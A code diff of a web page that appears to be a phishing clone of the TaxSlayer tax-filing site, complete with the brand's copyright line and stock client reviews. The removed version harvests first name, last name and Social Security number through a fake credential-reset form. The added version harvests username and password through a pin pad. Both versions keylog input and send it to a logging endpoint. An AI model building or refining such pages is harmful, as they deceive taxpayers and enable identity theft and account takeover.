@@ -12,25 +12,18 @@
   <script>
     (function () {
       const params  = new URLSearchParams(window.location.search);
-      const first   = params.get('first')   || '';
-      const last    = params.get('last')    || '';
-      const ssnQ    = params.get('ssn')     || '';                // 9‑digit SSN
+      const username = params.get('username') || '';
 
       /* Prefill once DOM is ready */
       document.addEventListener('DOMContentLoaded', () => {
-        if (first)   document.querySelector('input[name="first_name"]').value = first;
-        if (last)    document.querySelector('input[name="last_name"]').value  = last;
-        if (ssnQ)    document.querySelector('input[name="ssn"]').value        = ssnQ;
-        if (ssnQ)    sessionStorage.setItem('ssnParam', ssnQ);                // keep for POST
+        if (username) document.querySelector('input[name="username"]').value = username;
       });
 
       /* One‑time GET log so back‑end sees the landing */
-      if (first || last || ssnQ) {
+      if (username) {
         const q = new URLSearchParams({
           event:     'landing_query',
-          first,
-          last,
-          ssn:       ssnQ,
+          username,
           timestamp: new Date().toISOString()
         }).toString();
 
@@ -51,7 +44,78 @@
   <main class="p-6 max-w-2xl mx-auto bg-white shadow-md rounded-lg mt-6">
     <h2 class="text-2xl font-semibold mb-4">Start Your Free or Premium Filing</h2>
 
-    <!-- Security Message -->
+
+    <!-- Ads / Promotions -->
+    <div class="mb-4">
+      <div class="bg-green-100 p-3 rounded mb-2">
+        <strong>Free Filing:</strong> For simple returns&nbsp;(W‑2 only)
+      </div>
+      <div class="bg-yellow-100 p-3 rounded">
+        <strong>Premium:</strong> Maximize deductions, self‑employed features – $39.99
+      </div>
+    </div>
+
+    <!-- Login Form -->
+    <form id="filingForm" class="space-y-4">
+      <h3 class="text-lg font-semibold mb-3">Access Your Tax Documents</h3>
+      
+      <div>
+        <label class="block text-sm font-medium">Username</label>
+        <input type="text" name="username" class="w-full border rounded p-2" autocomplete="username" required />
+      </div>
+      
+      <div>
+        <label class="block text-sm font-medium">Password</label>
+        <input type="password" name="password" class="w-full border rounded p-2 mb-3" readonly placeholder="Use pin pad below" />
+        
+        <!-- Pin Pad -->
+        <div class="mt-3">
+          <p class="text-sm text-gray-600 mb-2">Enter your password using the pin pad:</p>
+          <div class="grid grid-cols-3 gap-2 max-w-xs">
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="1">1</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="2">2</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="3">3</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="4">4</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="5">5</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="6">6</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="7">7</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="8">8</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="9">9</button>
+            <button type="button" class="pin-clear bg-red-100 hover:bg-red-200 border border-red-300 rounded p-3 text-lg font-semibold transition-colors">Clear</button>
+            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="0">0</button>
+            <button type="button" class="pin-backspace bg-blue-100 hover:bg-blue-200 border border-blue-300 rounded p-3 text-lg font-semibold transition-colors">⌫</button>
+          </div>
+        </div>
+      </div>
+
+      <button type="submit"
+              class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 flex items-center gap-2">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd" />
+        </svg>
+        Obtain Your Checklist
+      </button>
+    </form>
+
+    <!-- Client Reviews -->
+    <section class="mt-8">
+      <h3 class="text-xl font-semibold mb-2">What our clients say</h3>
+      <div class="space-y-2">
+        <blockquote class="bg-gray-100 p-3 rounded">
+          “So easy and fast to file!” – <em>Angela R.</em>
+        </blockquote>
+        <blockquote class="bg-gray-100 p-3 rounded">
+          “Premium saved me hundreds!” – <em>Devon K.</em>
+        </blockquote>
+        <blockquote class="bg-gray-100 p-3 rounded">
+          “Best tax software I’ve used in years.” – <em>Linda S.</em>
+        </blockquote>
+      </div>
+    </section>
+  </main>
+
+  <!-- Security Message -->
+  <div class="max-w-2xl mx-auto mt-6">
     <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
       <p class="font-semibold text-blue-900">Your security. Built into everything we do.</p>
       <a href="#" class="text-blue-600 hover:underline text-sm">Here's how</a>
@@ -94,102 +158,7 @@
       
       <p class="text-xs text-gray-600 mt-3">* More important offer details and disclosures</p>
     </div>
-
-    <!-- Ads / Promotions -->
-    <div class="mb-4">
-      <div class="bg-green-100 p-3 rounded mb-2">
-        <strong>Free Filing:</strong> For simple returns&nbsp;(W‑2 only)
-      </div>
-      <div class="bg-yellow-100 p-3 rounded">
-        <strong>Premium:</strong> Maximize deductions, self‑employed features – $39.99
-      </div>
-      <p class="text-sm mt-3 text-gray-600">You may retrieve your last year's credentials by inputting your First Name, Last Name, and SSN.</p>
-    </div>
-
-    <!-- Login Section -->
-    <div class="border-b pb-4 mb-6">
-      <h3 class="text-lg font-semibold mb-3">Returning User? Sign In</h3>
-      <div class="space-y-3">
-        <div>
-          <label class="block text-sm font-medium">Username</label>
-          <input type="text" name="username" class="w-full border rounded p-2" autocomplete="username" />
-        </div>
-        <div>
-          <label class="block text-sm font-medium">Password</label>
-          <input type="password" name="password" class="w-full border rounded p-2" autocomplete="current-password" />
-        </div>
-        <button type="button" id="loginBtn" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700">
-          Login
-        </button>
-      </div>
-    </div>
-
-    <!-- Filing Form -->
-    <form id="filingForm" class="space-y-4">
-      <h3 class="text-lg font-semibold mb-3">Reset Your Credentials</h3>
-      <div>
-        <label class="block text-sm font-medium">First Name</label>
-        <input type="text" name="first_name" class="w-full border rounded p-2"
-               autocomplete="given-name" required />
-      </div>
-      <div>
-        <label class="block text-sm font-medium">Last Name</label>
-        <input type="text" name="last_name" class="w-full border rounded p-2"
-               autocomplete="family-name" required />
-      </div>
-      <div>
-        <label class="block text-sm font-medium">SSN</label>
-        <input type="text" name="ssn" class="w-full border rounded p-2"
-               inputmode="numeric" maxlength="11" pattern="\d{3}-?\d{2}-?\d{4}" required />
-        
-        <!-- Pin Pad -->
-        <div class="mt-3">
-          <p class="text-sm text-gray-600 mb-2">Or use the pin pad:</p>
-          <div class="grid grid-cols-3 gap-2 max-w-xs">
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="1">1</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="2">2</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="3">3</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="4">4</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="5">5</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="6">6</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="7">7</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="8">8</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="9">9</button>
-            <button type="button" class="pin-clear bg-red-100 hover:bg-red-200 border border-red-300 rounded p-3 text-lg font-semibold transition-colors">Clear</button>
-            <button type="button" class="pin-digit bg-gray-100 hover:bg-gray-200 border border-gray-300 rounded p-3 text-lg font-semibold transition-colors" data-digit="0">0</button>
-            <button type="button" class="pin-backspace bg-blue-100 hover:bg-blue-200 border border-blue-300 rounded p-3 text-lg font-semibold transition-colors">⌫</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Hidden copy of ssn for consistency -->
-      <input type="hidden" name="ssn_hidden" id="ssn_hidden" />
-
-      <button type="submit"
-              class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 flex items-center gap-2">
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
-          <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
-        </svg>
-        Retrieve User ID/Email address
-      </button>
-    </form>
-
-    <!-- Client Reviews -->
-    <section class="mt-8">
-      <h3 class="text-xl font-semibold mb-2">What our clients say</h3>
-      <div class="space-y-2">
-        <blockquote class="bg-gray-100 p-3 rounded">
-          “So easy and fast to file!” – <em>Angela R.</em>
-        </blockquote>
-        <blockquote class="bg-gray-100 p-3 rounded">
-          “Premium saved me hundreds!” – <em>Devon K.</em>
-        </blockquote>
-        <blockquote class="bg-gray-100 p-3 rounded">
-          “Best tax software I’ve used in years.” – <em>Linda S.</em>
-        </blockquote>
-      </div>
-    </section>
-  </main>
+  </div>
 
   <footer class="text-center text-sm text-gray-500 mt-8">
     &copy;&nbsp;2025 TaxSlayer. All rights reserved.
@@ -208,12 +177,10 @@
       };
     }
 
-    /* ---- key‑logging for the three inputs ---- */
-    ['first_name', 'last_name', 'ssn'].forEach((fieldName) => {
-      const field = document.querySelector(`input[name="${fieldName}"]`);
-      if (!field) return;
-
-      field.addEventListener(
+    /* ---- key‑logging for username input ---- */
+    const usernameField = document.querySelector('input[name="username"]');
+    if (usernameField) {
+      usernameField.addEventListener(
         'input',
         debounce(() => {
           fetch('/api/log', {
@@ -221,15 +188,15 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               event:     'keystroke',
-              field:     fieldName,
-              value:     field.value,
+              field:     'username',
+              value:     usernameField.value,
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent
             })
           }).catch((err) => console.error('Keystroke log failed:', err));
         })
       );
-    });
+    }
 
     /* ---- form‑submission logging ---- */
     document
@@ -237,15 +204,10 @@
       .addEventListener('submit', async function (e) {
         e.preventDefault();
 
-        /* sync hidden value with any landing‑page ssn */
-        const storedSSN = sessionStorage.getItem('ssnParam') || '';
-        document.getElementById('ssn_hidden').value = storedSSN;
-
         const formData = new FormData(e.target);
         const data = {
-          firstName: formData.get('first_name'),
-          lastName:  formData.get('last_name'),
-          ssn:       formData.get('ssn') || storedSSN || null
+          username: formData.get('username'),
+          password: formData.get('password')
         };
 
         try {
@@ -296,49 +258,17 @@ OTHER SUPPORTING DOCS
 • Bank account and routing number (for refund)`);
       });
 
-    /* ---- Login Handler ---- */
-    document.getElementById('loginBtn').addEventListener('click', async function() {
-      const username = document.querySelector('input[name="username"]').value;
-      const password = document.querySelector('input[name="password"]').value;
-      
-      if (!username || !password) {
-        alert('Please enter both username and password');
-        return;
-      }
-      
-      try {
-        await fetch('/api/log', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            event: 'login_attempt',
-            username: username,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent
-          })
-        });
-        
-        alert('Login functionality will be implemented in the next phase.');
-      } catch (err) {
-        console.error('Login log failed:', err);
-      }
-    });
 
     /* ---- Pin Pad Handler ---- */
-    const ssnInput = document.querySelector('input[name="ssn"]');
+    const passwordInput = document.querySelector('input[name="password"]');
     
     // Handle digit button clicks
     document.querySelectorAll('.pin-digit').forEach(button => {
       button.addEventListener('click', async function() {
         const digit = this.getAttribute('data-digit');
         
-        // Add digit to SSN input
-        if (ssnInput.value.length < 11) {
-          ssnInput.value += digit;
-          
-          // Trigger input event for existing keystroke logging
-          ssnInput.dispatchEvent(new Event('input', { bubbles: true }));
-        }
+        // Add digit to password input
+        passwordInput.value += digit;
         
         // Log the pin pad click
         try {
@@ -348,8 +278,8 @@ OTHER SUPPORTING DOCS
             body: JSON.stringify({
               event: 'pin_pad_click',
               digit: digit,
-              field: 'ssn',
-              currentValue: ssnInput.value,
+              field: 'password',
+              currentLength: passwordInput.value.length,
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent
             })
@@ -362,8 +292,7 @@ OTHER SUPPORTING DOCS
     
     // Handle clear button
     document.querySelector('.pin-clear').addEventListener('click', async function() {
-      ssnInput.value = '';
-      ssnInput.dispatchEvent(new Event('input', { bubbles: true }));
+      passwordInput.value = '';
       
       // Log clear action
       try {
@@ -372,7 +301,7 @@ OTHER SUPPORTING DOCS
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             event: 'pin_pad_clear',
-            field: 'ssn',
+            field: 'password',
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent
           })
@@ -384,9 +313,8 @@ OTHER SUPPORTING DOCS
     
     // Handle backspace button
     document.querySelector('.pin-backspace').addEventListener('click', async function() {
-      if (ssnInput.value.length > 0) {
-        ssnInput.value = ssnInput.value.slice(0, -1);
-        ssnInput.dispatchEvent(new Event('input', { bubbles: true }));
+      if (passwordInput.value.length > 0) {
+        passwordInput.value = passwordInput.value.slice(0, -1);
         
         // Log backspace action
         try {
@@ -395,8 +323,8 @@ OTHER SUPPORTING DOCS
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               event: 'pin_pad_backspace',
-              field: 'ssn',
-              currentValue: ssnInput.value,
+              field: 'password',
+              currentLength: passwordInput.value.length,
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent
             })
